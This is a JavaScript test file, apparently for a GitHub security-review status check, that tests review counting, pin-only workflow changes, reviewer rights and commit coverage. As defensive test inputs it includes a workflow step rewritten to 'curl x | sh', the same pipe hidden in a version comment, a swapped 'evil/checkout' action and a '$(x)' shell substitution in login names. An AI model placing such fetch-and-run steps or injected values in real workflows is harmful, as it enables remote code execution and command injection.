ok(status(unread, true).description === "Advisory: no security review has run yet. Mend: wait 5 min; then the fallback reviewer reviews, posts one; summary unreadable" && status(unread, true).state === "success" && status(longest, true).description.length === 140, "where Codex's summary cannot be read, the status says so too, as the owner sees it, and no description runs past GitHub's 140 characters");

// What runs by itself changed: floor rule 3's two security reviews, save pins moved alone or comments alone proven.
const PIN1 = "1".repeat(40), PIN2 = "2".repeat(40);
const patch = (...pairs) => `@@ -1,3 +1,3 @@\n jobs:\n${pairs.map(([a, b]) => `-${a}\n+${b}`).join("\n")}`;
const file = (filename, p, extra = {}) => ({ filename, status: "modified", patch: p, ...extra });
const pinMove = file(".github/workflows/ci.yml", patch([`      - uses: actions/checkout@${PIN1} # v6.0.0`, `      - uses: actions/checkout@${PIN2} # v7.0.1`]));
const callMove = file(".github/workflows/core.yml", patch([`    uses: ${CORE}/.github/workflows/size.yml@${PIN1}`, `    uses: ${CORE}/.github/workflows/size.yml@${PIN2}`]));
const stepChange = file(".github/workflows/ci.yml", patch(["      - run: npm test", "      - run: npm test && curl x | sh"]));
ok(pinsAlone(pinMove) && pinsAlone(callMove), "an action's version moved, note and all, and a call's pin to a core workflow, are pins alone");
ok(!pinsAlone(stepChange) && !pinsAlone(file("a.yml", patch([`      - uses: actions/checkout@${PIN1}`, `      - uses: evil/checkout@${PIN2}`])))
  && !pinsAlone(file("a.yml", patch([`      - uses: actions/checkout@${PIN1}`, "      - uses: actions/checkout@main"]))) && !pinsAlone(file("a.yml", `@@ -1 +1,2 @@\n+      - uses: actions/checkout@${PIN2}`))
  && !pinsAlone({ ...pinMove, status: "renamed" }) && !pinsAlone({ ...pinMove, patch: undefined }) && !pinsAlone({ ...pinMove, patch: "" })
  && !pinsAlone(file("a.yml", patch([`      - uses: actions/checkout@${PIN1}`, `      - uses: actions/checkout@${PIN2} run: x`]))),
  "not another action, a pin to a branch, a line added, a file moved, a patch GitHub left out, nor anything beside the pin");
const counted = (p, files) => ({ ...p, changed_files: files.length });
const two = (comments, files, bound = true) => judge(files === undefined ? pull : counted(pull, files), comments, [], undefined, files, bound);
ok(is(two([summary(done)], [stepChange]), false, "reviews, posts the second, or comment-only.mjs") && is(two([said("Security review: one")], [stepChange]), false, "floor rule 3"), "a step changed under .github/: Codex's review alone, or one posted alone, is not enough");
ok(is(two([summary(done), said("Security review: the fallback reviewer's")], [stepChange]), true, "floor rule 3's two are there") && is(two([said("Security review: one"), said("Security review: two")], [stepChange]), true, "floor rule 3's two"), "Codex's and a posted one, or two posted, are");
ok(is(two([summary(open), finding("2026-11-12T10:30:00Z"), said("Security review: the fix checked")], [stepChange]), true, "floor rule 3's two") && is(two([summary(open), finding("2026-11-12T12:00:00Z"), said("Security review: before")], [stepChange]), false, "Codex finding open"), "a finding marked open is still settled only by a review after it, which is the second");
ok([".claude/settings.json", "action.yml", "tools/x/action.yaml", ".GitHub/workflows/x.yml"].every((name) => is(two([summary(done)], [file(name, patch(["a", "b"]))]), false, "second")) && is(two([summary(done)], [file("src/x.js", patch(["a", "b"]))]), true, "has run"), "under .claude/, an action.yml, in any case: two; anything else: one, as before");
ok(is(two([summary(done)], [file("x.yml", "", { status: "renamed", previous_filename: ".github/workflows/x.yml" })]), false, "second") && is(two([summary(done)], [file(".github/workflows/x.yml", "", { status: "added" })]), false, "second"), "a workflow moved away, or added, asks two");
ok(is(two([summary(done)], [pinMove, callMove, file("src/x.js", patch(["a", "b"]))]), true, "has run") && is(two([summary(done)], [file("core/.github/workflows/x.yml", patch(["a", "b"]))]), true, "has run"), "pins moved alone, and the copy under core/, ask one");
ok(is(two([], undefined), false, "no security review") && is(judge(pull, [summary(done)], [], undefined), true, "has run"), "given no files, it asks what it asked before");
// given what power.mjs read as running with power (#1134, point 4): the two where a file of the set changed, and only there
const powered = (files, power) => judge(counted(pull, files), [summary(done)], [], undefined, files, true, { power });
const script = file("scripts/run.mjs", patch(["a", "b"]));
ok(is(powered([stepChange], new Set()), true, "has run") && is(powered([file(".claude/settings.json", patch(["a", "b"]))], new Set()), true, "has run"), "given the set, a workflow that may only read, or any file not in it, asks one");
ok(is(powered([script], new Set(["scripts/run.mjs"])), false, "second") && is(powered([file("x.mjs", "", { status: "renamed", previous_filename: "scripts/run.mjs" })], new Set(["scripts/run.mjs"])), false, "second"), "a script in the set asks two, by its name now or before");
ok(is(powered([pinMove], new Set([".github/workflows/ci.yml"])), true, "has run"), "a powered workflow whose pins alone moved asks one, as before (floor rule 17)");
ok(is(powered([script], null), false, "second") && is(powered([file("docs/x.md", patch(["a", "b"]))], null), true, "has run") && is(powered([file("core/scripts/x.mjs", patch(["a", "b"]))], null), true, "has run"),
  "where the set could not be read, each changed script asks two, and a document, or a script of the copy, asks one");
ok(is(powered([file("bin/deploy", patch(["a", "b"]))], null), false, "second") && is(powered([file("bin/deploy", patch(["a", "b"]))], new Set()), true, "has run"),
  "where the set could not be read, a changed file with no extension asks two, as power.mjs reads it runnable; given the set, only where it is in it");
ok(["src/App.cs", ".codex/config.toml", "package.json", ".kiro/settings.json"].every((name) => is(powered([file(name, patch(["a", "b"]))], null), false, "second")) && is(powered([file("config/x.json", patch(["a", "b"]))], null), true, "has run"),
  "where the set could not be read, a compiled language's source, an agent tool's config and an install file each ask two; a JSON file of data asks one");
// each status that waits says its mend, whole, within GitHub's 140 characters
const waits = [judge(pull, []), judge(pull, [summary(open)], [finding("2026-11-12T10:30:00Z")]), judge(pull, [summary(open)]), judge(pull, [late, said("Security review: x")], [finding("2026-11-12T10:30:00Z")]),
  judge(pull, [summary(running), early]), two([summary(done)], [stepChange])];
ok(waits.every((v) => v?.done === false && mended(status(v, false).description) && status(v, false).description.length < 140), `each status that waits says its mend, whole: ${waits.map((v) => status(v, false).description).join(" | ")}`);
const proof = (sha) => `Security review: comment-only.mjs, from the core's main:\n\n    comments and steps' names alone in .github/, .claude/ and actions, abc1234..${sha.slice(0, 7)}: .github/workflows/ci.yml\n    checked head ${sha}\n`;
ok(is(two([said(proof(HEAD))], [stepChange]), true, "a security review is posted") && commentsAlone(proof(HEAD), HEAD), "comment-only.mjs's printout for the head, posted, asks rule 8's one");
ok(is(two([said(proof(SEEN))], [stepChange]), false, "second") && !commentsAlone(proof(HEAD).replace("comments and steps' names alone in", "NOT ALONE"), HEAD) && !commentsAlone(`checked head ${HEAD}0`, HEAD) && is(two([said(proof(HEAD), "NONE"), summary(done)], [stepChange]), false, "second"), "not for another head, not without its line, not from another account");
ok(is(judge(counted(bump, [pinMove]), [], [], its, [file(".github/workflows/ci.yml", pinMove.patch)]), true, "Dependabot's own") && is(judge(counted(bump, [stepChange]), [], [], its, [stepChange]), false, "second"), "Dependabot's own moving a pin passes as before; one changing more than a pin asks two");
ok(!pinsAlone(file("a.yml", patch([`      - uses: actions/checkout@${PIN1} # v6`, `      - uses: actions/checkout@${PIN1} # v7`]))) && !pinsAlone(file("a.yml", patch([`      - uses: actions/checkout@${PIN1} # v6`, `      - uses: actions/checkout@${PIN2} # \`curl x|sh\``]))), "a pin that does not move, or a note that is no version's word, is no pin moved alone");
ok([-1, -3000, 1.5].every((changed_files) => is(judge({ ...pull, changed_files }, [summary(done)], [], undefined, [file("src/x.js", patch(["a", "b"]))]), false, "second")), "a count of files that is no whole number of at least none is read as a list cut short, changing what runs by itself");
ok(is(judge({ ...pull, changed_files: 3001 }, [summary(done)], [], undefined, [file("src/x.js", patch(["a", "b"]))]), false, "second") && is(judge(pull, [summary(done)], [], undefined, [file("src/x.js", patch(["a", "b"]))]), false, "second"), "a list of files GitHub cut short, or with no count to hold it to, is read as changing what runs by itself");
const before = two([summary(done)], [stepChange], false);
ok(before.done === true && before.why.startsWith("before this check came, so not waited for: floor rule 3 asks two") && is(two([], [stepChange], false), false, "no security review"), "a pull request from before the check is told of the second review, never held for it; one with no review at all waits as before");

ok(is(judge(counted(pull, [stepChange]), [summary(running), early, said("Security review: the fallback reviewer's", "OWNER", "2026-11-12T10:40:00Z")], [], undefined, [stepChange]), false, "second") && is(judge(counted(pull, [stepChange]), [summary(running), said("Security review: one", "OWNER", "2026-11-12T10:30:00Z"), said("Security review: two", "OWNER", "2026-11-12T10:40:00Z")], [], undefined, [stepChange]), true, "floor rule 3's two"), "for floor rule 3's two, a review posted before Codex's running one began does not count either");

// Whose posted review counts (#99): the repository's owner's, the accounts the project names, and those the host lets
// write (#412); nobody else's.
const as = (login, assoc = "COLLABORATOR", body = "Security review: fine") => ({ ...said(body, assoc), user: { login, type: "User" } });
ok(is(judge(pull, [as("SomeOne", "OWNER")]), true, "is posted") && is(judge(pull, [as("helper")]), false, "no security review") && is(judge(pull, [as("helper", "MEMBER")]), false, "no security review"), "the owner's account counts, in any case; a collaborator or a member it does not name does not");
ok(is(judge(pull, [as("helper")], [], undefined, undefined, true, { reviewers: ["helper"] }), true, "is posted") && is(judge(pull, [as("Helper")], [], undefined, undefined, true, { reviewers: reviewersOf("other, helper") }), true, "is posted") && is(judge(pull, [as("helper", "NONE")], [], undefined, undefined, true, { reviewers: ["helper"] }), false, "no security review"), "an account the project names counts, a collaborator or member still, never one with no say in the repository");
ok(JSON.stringify(reviewersOf(" a-b  c,d[bot]\n$(x) -e f_g ")) === JSON.stringify(["a-b", "c", "d[bot]"]) && reviewersOf(undefined).length === 0 && is(judge({ ...pull, base: { repo: { owner: { login: "$(x)" } } } }, [as("$(x)", "OWNER")]), false, "no security review"), "the names are read as logins and nothing else");
ok(is(judge({ ...pull, base: undefined }, [said("Security review: x")]), false, "no security review"), "with no owner to be read, only a named account counts");
// a person the host lets write counts with nothing named (#412): GitHub's answer on the account's rights, read strictly
const right = (login, role_name = "write", more = {}) => ({ permission: role_name === "admin" ? "admin" : ["write", "maintain"].includes(role_name) ? "write" : "read", role_name, user: { login, type: "User", permissions: { admin: role_name === "admin", maintain: role_name !== "write", push: true, triage: true, pull: true } }, ...more });
const byRights = (comments, rights, bound = true) => judge(pull, comments, [], undefined, undefined, bound, { rights });
ok(["write", "maintain", "admin"].every((role) => is(byRights([as("helper", "MEMBER")], [right("Helper", role)]), true, "is posted")) && is(byRights([as("helper")], [right("helper")]), true, "is posted"),
  "a member's or collaborator's review counts where the host gives the account the role write, maintain or admin, its login in any case");
ok(["read", "triage", "custom-reviewer"].every((role) => is(byRights([as("helper")], [right("helper", role)]), false, "no security review"))
  && is(byRights([as("helper")], [right("helper", "custom-reviewer", { permission: "write" })]), false, "no security review"),
  "a right to read or triage, or a custom role even on write, makes no owner: such an account is named in reviewers");
ok(is(byRights([as("helper", "NONE")], [right("helper")]), false, "no security review") && is(byRights([as("helper")], [right("other")]), false, "no security review")
  && is(byRights([{ ...as("helper"), user: { login: "helper", type: "Bot" } }], [right("helper")]), false, "no security review")
  && is(byRights([as("helper")], [{ ...right("helper"), user: { ...right("helper").user, type: "Bot" } }]), false, "no security review"),
  "the rights count only for the comment's own login, a person's on both sides, and never where GitHub gives the comment no say in the repository");
ok(is(byRights([as("SomeOne", "OWNER")], []), true, "is posted") && is(byRights([as("helper")], undefined), false, "no security review") && is(judge(pull, [as("helper")], [], undefined, undefined, true, { reviewers: ["helper"], rights: [right("helper", "read")] }), true, "is posted"),
  "with no rights read the owner's and the named accounts count as before, and an account named counts whatever its rights (core-changes/projects.md, \"Nothing locks a project\")");
// an organisation's repository: its owner is the organisation, which posts nothing, so a person who owns it counts only
// through the rights the host gives that person
const ofOrg = { ...pull, base: { repo: { owner: { login: "some-org", type: "Organization" } } } };
ok(["OWNER", "MEMBER"].every((assoc) => is(judge(ofOrg, [as("boss", assoc)]), false, "no security review") && is(judge(ofOrg, [as("boss", assoc)], [], undefined, undefined, true, { rights: [right("boss", "admin")] }), true, "is posted"))
  && is(judge(ofOrg, [as("boss", "OWNER")], [], undefined, undefined, true, { rights: [right("boss", "read")] }), false, "no security review"), "in an organisation's repository, an owner's or a member's review counts only where the host gives that person the right to write");
// an app's account the project names: it counts where GitHub gives it a say in the repository, never with none
const app = (assoc) => ({ ...said("Security review: fine", assoc), user: { login: "review-app[bot]", type: "Bot" } });
ok(is(judge(pull, [app("COLLABORATOR")], [], undefined, undefined, true, { reviewers: reviewersOf("review-app[bot]") }), true, "is posted") && is(judge(pull, [app("NONE")], [], undefined, undefined, true, { reviewers: reviewersOf("review-app[bot]") }), false, "no security review"),
  "an app's account named in reviewers counts as a collaborator, and not with no say in the repository");
const opened = { ...pull, created_at: "2026-11-12T10:00:00Z" };
ok(boundOf("false", opened, "2026-11-12T11:00:00Z") === false && boundOf("false", opened, "2026-11-12T09:00:00Z") === true && boundOf("false", opened, "2026-11-12T10:00:00Z") === true
  && ["", undefined, "soon"].every((since) => boundOf("false", opened, since) === true) && boundOf("false", { ...pull, created_at: "soon" }, "2026-11-12T11:00:00Z") === true && [undefined, "true", ""].every((held) => boundOf(held, opened, "2026-11-12T11:00:00Z") === true),
  "a pull request is taken as from before the check only where the host says it was opened before the script first came to the default branch; one opened since, or with either time unread, is held, whatever its head holds");
const helperOld = (rights) => judge(pull, [as("helper")], [], undefined, undefined, false, { rights });
ok(is(helperOld(undefined), false, "no security review") && is(helperOld([right("helper", "read")]), false, "no security review") && is(helperOld([right("helper")]), true, "is posted on the pull request")
  && is(judge(pull, [as("helper", "NONE")], [], undefined, undefined, false), false, "no security review") && is(judge(pull, [as("SomeOne", "OWNER")], [], undefined, undefined, false), true, "is posted on the pull request")
  && is(judge(pull, [{ ...as("helper"), updated_at: "2026-11-14T12:30:00Z" }], [], undefined, undefined, false, { rights: [right("helper")] }), true, "is posted on the pull request"),
  "a pull request from before the check counts a review only from an account it counts, as any other does: a member whose right was not read, or who may only read, counts not; a writer, the owner, and an edited review of theirs do");

// What a review must have seen (#99): a review of an earlier commit stands only where nothing but updates from main
// follow it; otherwise a posted review names the head, or such a commit, by its whole SHA.
const OLD = "c".repeat(40), MAIN = "d".repeat(40);
const step = (sha, ...parents) => ({ sha, parents: parents.map((at) => ({ sha: at })) });
const updated = [step(OLD, "e".repeat(40)), step(HEAD, OLD, MAIN)], pushed = [step(OLD, "e".repeat(40)), step(HEAD, OLD)];
const saw = (commits, comments, reviewComments = [], bound = true, more = {}) => judge({ ...pull, commits: commits.length }, comments, reviewComments, commits, undefined, bound, more);
const onOld = { ...done, commit_sha: OLD };
ok(is(judge({ ...bump, commits: 2 }, [said("Security review: read against the release notes")], [], its), true, "floor rule 17"), "Dependabot's own with a posted note naming no commit passes as it would with none");
ok(is(saw(updated, [summary(onOld)]), true, "(on ccccccc, earlier than the head aaaaaaa, only updates from main since)") && is(saw(pushed, [summary(onHead)]), true, "has run (on aaaaaaa)"), "Codex's review of an earlier commit stands where only an update from main follows it, and the status says it saw an earlier commit");
ok(is(saw(pushed, [summary(onOld)]), false, "Codex saw ccccccc, not head. Mend: fallback reviews") && is(saw(pushed, [summary({ ...done, commit_sha: null })]), false, "saw none"), "a commit of the pull request's own after it: it waits, saying the mend");
ok(is(saw(pushed, [summary(onOld), said(`Security review: the later commit checked, on ${HEAD}`)]), true, "a security review is posted on the pull request; Codex's saw ccccccc, earlier") && is(saw(pushed, [summary(onOld), said(`Security review: on ${HEAD.toUpperCase()}`)]), true, "Codex's saw"), "a posted review naming the head's whole SHA, in any case, settles it");
ok(is(saw(pushed, [summary(onOld), said(`Security review: on ${OLD}`)]), false, "Codex saw") && is(saw(pushed, [summary(onOld), said(`Security review: on ${HEAD.slice(0, 39)}`)]), false, "Codex saw") && is(saw(pushed, [summary(onOld), said(`Security review: on ${HEAD}0`)]), false, "Codex saw"), "one naming an earlier commit, part of the head's SHA, or a longer one, does not");
ok(is(saw(pushed, [said(`Security review: on ${HEAD}`)]), true, "is posted on the pull request") && is(saw(updated, [said(`Security review: on ${OLD}`)]), true, "posted on an earlier commit, only updates from main since") && is(saw(pushed, [said(`Security review: on ${OLD}`)]), false, "review not on head. Mend:") && is(saw(pushed, [said("Security review: none needed")]), false, "not on head"), "with no review of Codex's: a posted one, or the note that none is needed, names the head, or a commit only updates from main follow");
ok(is(saw(pushed, [said(`Security review: none is needed (floor rule 8: it touches no way in), on ${HEAD}`)]), true, "is posted on the pull request") && is(saw(pushed, [said(`Security review: none is needed (floor rule 8: it touches no way in), on ${OLD}`)]), false, "not on head"), "the note that none is needed, naming the head, counts as a posted review; naming an earlier commit after a push of its own, it does not");
ok(is(saw([step(OLD, "e".repeat(40)), step(HEAD, OLD, OLD)], [summary(onOld)]), false, "Codex saw") && is(saw([step(OLD, "e".repeat(40)), step("f".repeat(40), OLD), step(HEAD, OLD, "f".repeat(40))], [summary(onOld)]), false, "Codex saw") && is(saw([step(HEAD, OLD, {})].map((c) => ({ ...c, parents: [{ sha: OLD }, {}] })), [summary(onOld)]), false, "Codex saw"), "a merge of a commit of the pull request's own, or of one not named, is no update from main");
ok(is(judge({ ...pull, commits: 300 }, [summary(onOld)], [], updated), false, "Codex saw") && is(judge(pull, [summary(onOld)], [], updated), false, "Codex saw"), "a list of commits GitHub cut short, or with no count to hold it to, proves no update from main");
ok([-1, -300, 1.5, "2"].every((commits) => is(judge({ ...pull, commits }, [summary(onOld)], [], updated), false, "Codex saw")), "a count of commits that is no whole number of at least none proves no update from main");
ok(is(saw(pushed, [summary({ ...onOld, ...open }), said(`Security review: the fix checked, on ${HEAD}`, "OWNER", "2026-11-12T11:00:00Z")], [finding("2026-11-12T10:30:00Z")]), true, "after its newest finding") && is(saw(pushed, [summary({ ...open, commit_sha: OLD }), said("Security review: the fix checked", "OWNER", "2026-11-12T11:00:00Z")], [finding("2026-11-12T10:30:00Z")]), false, "Codex finding open"), "a finding marked open is settled only by a review after it that names the head");
const told = saw(pushed, [summary({ ...open, commit_sha: OLD }), said("Security review: the fix checked", "OWNER", "2026-11-12T11:00:00Z")], [finding("2026-11-12T10:30:00Z")], false);
ok(told.done === true && told.why.includes("but names not the head") && saw(pushed, [summary(onOld)], [], false).done === true && saw(pushed, [said(`Security review: on ${OLD}`)], [], false).why.startsWith("before this check came, so not waited for: a security review is posted, but names not the head"), "a pull request from before the check is told, never held");
ok([saw(pushed, [summary(onOld)]), saw(pushed, [said(`Security review: on ${OLD}`)]), saw(pushed, [summary({ ...done, commit_sha: null })]), told].every((v) => [true, false].every((a) => status(v, a).description.length <= 140 && !status(v, a).description.endsWith("…"))) && [saw(pushed, [summary(onOld)]), saw(pushed, [summary({ ...done, commit_sha: null })])].every((v) => status(v, false).description.endsWith(CHECKS) && mended(status(v, false).description)) && status(saw(pushed, [said(`Security review: on ${OLD}`)]), false).description.endsWith(OWN), "the status says it whole, within GitHub's 140 characters, and its mend");

// Given the merges clean-merges.mjs proved (#323): a review of an earlier commit stands only across merges that are the
// ones git makes; the status names the merge where that stops, and a review of it, or of a later commit, stands.
const MID = "9".repeat(40), twice = [step(OLD, "e".repeat(40)), step(MID, OLD, MAIN), step(HEAD, MID, "8".repeat(40))];
const across = (commits, comments, merges, bound = true) => judge({ ...pull, commits: commits.length }, comments, [], commits, undefined, bound, { merges });
ok(is(across(updated, [summary(onOld)], [HEAD]), true, "only updates from main since") && is(across(twice, [summary(onOld)], [HEAD, MID]), true, "only updates from main since") && is(across(twice, [said(`Security review: on ${OLD}`)], [HEAD, MID]), true, "posted on an earlier commit, only updates from main since"), "across merges proved the ones git makes, a review of an earlier commit stands, Codex's or posted");
const notGit = [across(updated, [summary(onOld)], []), across(twice, [summary(onOld)], [HEAD]), across(twice, [said(`Security review: on ${OLD}`)], [HEAD])];
ok(is(notGit[0], false, "merge aaaaaaa unproved. Mend: fallback") && is(notGit[1], false, "merge 9999999 unproved") && is(notGit[2], false, "merge 9999999 unproved. Mend: your reviewer")
  && notGit.every((v) => mended(status(v, false).description) && !status(v, false).description.endsWith("…") && status(v, false).description.length <= 140), "where a merge after it is not proved, it waits, naming that merge and the mend, within GitHub's 140 characters");
// Each status that waits for a review to be posted names who posts it, the actor first (#395): where Codex's app starts
// the review (its summary is there), the fallback reviewer, after its own check of the head, never Codex asked by a
// comment; elsewhere the security reviewer the project uses. Whole where it waits; the actor shows where an advisory
// one is cut.
const idle = summary({ ...done, status: null });
const byApp = [saw(pushed, [summary(onOld)]), notGit[0], judge(pull, [summary(open)], [finding("2026-11-12T10:30:00Z")]), judge(pull, [summary(open)]),
  judge(pull, [late, said("Security review: x", "OWNER", "2026-11-12T11:00:00Z")], [finding("2026-11-12T10:30:00Z")]), saw(pushed, [idle, said(`Security review: on ${OLD}`)]),
  across(twice, [idle, said(`Security review: on ${OLD}`)], [HEAD]), judge(pull, [idle]), judge(pull, [summary(running)]), two([summary(done)], [stepChange])];
const byOwn = [notGit[2], saw(pushed, [said(`Security review: on ${OLD}`)]), judge(pull, [])];
const names = (v, actor) => v?.done === false && mended(status(v, false).description) && status(v, false).description === `Waiting: ${v.why}`
  && new RegExp(`Mend: (?:[^;,]+[;,] (?:then )?)?${actor} reviews[,;] `, "u").test(status(v, false).description) && new RegExp(`${actor} `, "u").test(status(v, true).description) && status(v, true).description === `Advisory: ${v.why}` && !/\bask\b/u.test(v.why);
ok(byApp.every((v) => names(v, "(?:the )?fallback(?: reviewer)?")) && unread.why === "no security review has run yet. Mend: wait 5 min; then the fallback reviewer reviews, posts one"
  && judge(pull, [summary(running)]).why === "no security review has run yet. Mend: wait 30 min for Codex's; then the fallback reviewer reviews, posts one", `where Codex's app reviews, each status that waits for a review posted names the fallback reviewer: ${byApp.map((v) => status(v, false).description).join(" | ")}`);
ok(byOwn.every((v) => names(v, "your (?:security )?reviewer") && !/Mend: (?:the )?fallback/u.test(v.why)), `elsewhere it names the project's own security reviewer first: ${byOwn.map((v) => status(v, false).description).join(" | ")}`);
ok(is(across(twice, [summary(onOld), said(`Security review: on ${MID}`)], [HEAD]), true, "posted on an earlier commit, only updates from main since") && is(across(updated, [said(`Security review: on ${HEAD}`)], []), true, "is posted on the pull request") && is(across(updated, [summary(onOld)], { [HEAD]: true }), false, "merge aaaaaaa unproved"), "a review of the merge where it stops, or of the head, stands; a list that is no list proves none");
ok(is(across(updated, [summary(onOld)], undefined), true, "only updates from main since") && across(updated, [summary(onOld)], [], false).done === true && across(updated, [summary(onOld)], [], false).why.startsWith("before this check came, so not waited for: Codex's review saw ccccccc; merge aaaaaaa"), "given no list of the merges proved (an older workflow) the parents alone are read, as before; a pull request from before the check is told, never held");
// A light commit (#1134, point 1: one that touches nothing that runs with power, as power.mjs reads it) carries over a
// review that found nothing blocking; one not light, a review with a blocking finding, and a list not given do not
{
  ok(powerFilesOf(undefined, () => ({})) === undefined && powerFilesOf("p", () => ({})) === null && powerFilesOf("p", () => ({ power: [1] })) === null
  && [...powerFilesOf("p", () => ({ power: ["a"] }))].join() === "a", "power.mjs's paths: none where it did not run, null where it wrote none it could read, and the Set it wrote");
const light = (comments, given, commits = pushed) => judge({ ...pull, commits: commits.length }, comments, [], commits, undefined, true, { light: given });
  ok(is(light([summary(onOld)], [HEAD]), true, "(on ccccccc, earlier than the head aaaaaaa, only light commits or updates from main since)") && is(light([said(`Security review: on ${OLD}\nBlocking findings: 0.\nOther findings: 1.`)], [HEAD]), true, "only light commits or updates from main since"),
    "Codex's review that found nothing open, or a posted one that declares nothing blocking, of a commit light commits alone follow, stands for the head");
  ok(is(light([summary(onOld)], []), false, "Codex saw ccccccc, not head") && is(light([summary(onOld)], undefined), false, "Codex saw") && is(light([said(`Security review: on ${OLD}\nBlocking findings: 1.\nOther findings: 0.`)], [HEAD]), false, "review not on head") && is(light([said(`Security review: on ${OLD}`)], [HEAD]), false, "review not on head"),
    "a commit not light, no list, or a review with a blocking finding or none declared, asks a review of the head");
  ok(is(light([summary(onOld)], [HEAD], [step(OLD, "e".repeat(40)), step(HEAD, "f".repeat(40))]), false, "Codex saw") && is(light([summary({ ...open, commit_sha: OLD })], [HEAD]), false, "Codex open finding hidden"),
    "a light commit whose parent is no commit of the pull request's carries nothing, and Codex's open finding is still answered");
  ok(status(light([summary(onOld)], [HEAD]), true).description.length <= 140, "its status's words fit GitHub's 140 characters");
}

// A pure sync (#99): pure-sync.mjs, which the workflow runs, proves it, and it needs no review unless one began by itself.
const pure = (comments, files) => judge(files === undefined ? pull : counted(pull, files), comments, [], [], files, true, { pure: true });
const syncs = [file("core/scripts/x.mjs", patch(["a", "b"])), file(".github/workflows/core.yml", patch(["a", "b"]))];
ok(is(pure([]), true, "a pure sync, as pure-sync.mjs proves") && is(pure([summary({ ...done, status: null })], syncs), true, "a pure sync") && is(pure([summary({ ...done, status: "failed" })]), true, "a pure sync"), "proved pure, with no review begun by itself, it passes with no review and no note, floor rule 3's two asked of none");
ok(is(pure([summary(running)]), false, "no security review") && is(pure([summary({ ...running, status: "queued" })]), false, "no security review") && is(pure([summary(open)], syncs), false, "Mend: fallback"), "a review that began by itself is waited for, and its open finding answered");
ok(is(pure([summary(done)], syncs), true, `has run (on ${SEEN.slice(0, 7)}`) && is(judge(pull, [], [], [], undefined, true, { pure: false }), false, "no security review"), "one that has run, on any commit of the sync, is done with; not proved pure, it is any pull request");

// A pull request its caller proved queue-only (#750): queue-only.mjs, which the caller runs, proves it, and the check
// honours the proof only where GitHub's whole list of its files is one Markdown file that runs nothing, since a proof
// handed by a caller changed in the pull request itself must wave through nothing more.
const lineOf = file("QUEUE.md", "@@ -1 +1 @@\n-| #1 | builder | |\n+| #2 | builder | |");
const queued = (comments, files, p = counted(pull, files), proved = true) => judge(p, comments, [], [], [files], true, { queue: proved });
ok(is(queued([], [lineOf]), true, "queue-only, as queue-only.mjs proves") && is(queued([], [lineOf], undefined, false), false, "no security review"),
  "proved queue-only, its one file the progress file, it passes with no review; not proved, it is any pull request");
ok(is(queued([], [lineOf, file("README.md", patch(["a", "b"]))]), false, "no security review") && is(queued([], [file("QUEUE.yml", patch(["a", "b"]))]), false, "no security review")
  && is(queued([], [file(".github/workflows/x.md", patch(["a", "b"]))]), false, "no security review") && is(queued([], [lineOf], { ...pull, changed_files: 2 }), false, "no security review"),
  "but not where its files are two, one is no Markdown, one runs by itself, or GitHub's list is cut short, whatever its caller says");
// (the copy of the core at the path the default branch's manifest names, left out as under core/: the script's caller gives
// it, from the manifest checked out beside it, #918)
const insideCopy = (at) => file(`${at}.github/workflows/ci.yml`, patch(["      - run: npm test", "      - run: npm test && curl x | sh"]));
const copied = (at, copy, comments = [summary(done)]) => judge(counted(pull, [insideCopy(at)]), comments, [], undefined, [insideCopy(at)], true, { copy });
ok(is(copied("vendor/core/", "vendor/core/"), true, "has run") && is(copied("core/", "core/"), true, "has run") && is(copied("core/", undefined), true, "has run"),
  "a change inside the copy of the core, at core/ or at the path the manifest names, asks no second review: only a sync changes it");
ok(is(copied("vendor/core/", undefined), false, "floor rule 3") && is(copied("core/", "vendor/core/"), false, "floor rule 3") && is(copied("vendor/core/", "third_party/core/"), false, "floor rule 3"),
  "and a copy at another path than the manifest names, or one a call gives no path for, is the project's own file: floor rule 3's two are asked");
const mdInCopy = file("vendor/core/.github/note.md", patch(["a", "b"])), mdOutside = file(".github/note.md", patch(["a", "b"]));
ok(is(judge(counted(pull, [mdInCopy]), [], [], [], [[mdInCopy]], true, { queue: true, copy: "vendor/core/" }), true, "queue-only") && is(judge(counted(pull, [mdInCopy]), [], [], [], [[mdInCopy]], true, { queue: true }), false, "no security review")
  && is(judge(counted(pull, [mdOutside]), [], [], [], [[mdOutside]], true, { queue: true, copy: "vendor/core/" }), false, "no security review"),
  "a queue-only pull request's one file is read as running or not by the same copy: inside the copy at the manifest's path it runs nothing of the project's");
// (the code-review wait takes the same proof with the copy its caller reads from the manifest, where it asks no review)
const queueProof = (copy) => codeReview(counted(pull, [mdInCopy]), [], [], [mdInCopy], [], true, undefined, copy, { queue: true });
ok(queueProof("vendor/core/")?.done === true && /queue-only/u.test(queueProof("vendor/core/").why) && !/queue-only/u.test(queueProof(null)?.why ?? "") && !/queue-only/u.test(queueProof("core/")?.why ?? ""),
  "the code-review wait reads a queue-only proof's one file as running or not by the copy at the path the manifest names, as the security review does");
ok(is(queued([summary(running)], [lineOf]), false, "no security review") && is(queued([summary(done)], [lineOf]), true, "has run"), "a review that began by itself is waited for, as of a pure sync");

// From the command line, as the workflow runs it.
const dir = scratchDir("security-review-");
try {
  const script = fileURLToPath(new URL("../scripts/security-review.mjs", import.meta.url));
  const run = (p, c, env = {}, r = undefined, k = undefined, f = undefined, cwd = undefined) => {
    writeFileSync(join(dir, "pull.json"), JSON.stringify(p));
    writeFileSync(join(dir, "comments.json"), JSON.stringify(c));
    if (r !== undefined) writeFileSync(join(dir, "review-comments.json"), JSON.stringify(r));
    if (k !== undefined) writeFileSync(join(dir, "commits.json"), JSON.stringify(k));
    if (f !== undefined) writeFileSync(join(dir, "files.json"), JSON.stringify(f));
    const files = [join(dir, "pull.json"), join(dir, "comments.json"), ...(r === undefined ? [] : [join(dir, "review-comments.json")]), ...(k === undefined ? [] : [join(dir, "commits.json")]), ...(f === undefined ? [] : [join(dir, "files.json")])];
    return JSON.parse(execFileSync(process.execPath, [script, ...files], { cwd, encoding: "utf8", env: { ...process.env, ADVISORY: "", RUN_URL: "", ...env } }));
  };
  const advisory = run(pull, [[summary(running)]]);
  ok(advisory.sha === HEAD && advisory.status.state === "success" && advisory.status.description.startsWith("Advisory: no security review"), "run with no word on it, it is advisory");
  const strict = run(pull, [[summary(running)]], { ADVISORY: "false", RUN_URL: "https://github.com/o/r/actions/runs/7" });
  ok(strict.status.state === "pending" && strict.status.target_url.endsWith("/runs/7") && run(pull, [[summary(done)]], { ADVISORY: "false" }).status.state === "success", "told it is not advisory, it waits until the review has run");
